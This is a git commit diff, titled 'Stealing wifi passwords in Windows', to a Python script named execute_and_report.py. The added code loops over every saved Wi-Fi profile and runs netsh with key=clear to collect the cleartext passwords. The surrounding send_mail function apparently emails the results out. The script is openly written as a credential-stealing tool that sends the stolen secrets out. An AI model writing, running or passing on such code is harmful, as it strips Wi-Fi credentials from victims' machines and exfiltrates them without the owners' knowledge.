fdcb442cc3d5e33579c42db0d64f1a0abbee2fc3
jean_kali <jeanandrewfuentes@gmail.com>
2020-03-16 06:24:56 -0400

    Stealing wifi passwords in Windows

--- execute_and_report.py
+++ execute_and_report.py
@@ -12,9 +12,15 @@ def send_mail(email, password, message):
 # For Windows
 command = "netsh wlan show profile"
 networks = subprocess.check_output(command, shell=True)
-network_names = re.findall(
+network_name_list = re.findall(
     "(?:Profile\s*:\s)(.*)", networks
 )
+
+result = ""
+for network_name in network_name_list:
+    command = "netsh wlan show profile {} key=clear".format(network_name)
+    current_result = subprocess.check_output(command, shell=True)
+    result = result + current_result
 
 email = ""
 password = ""
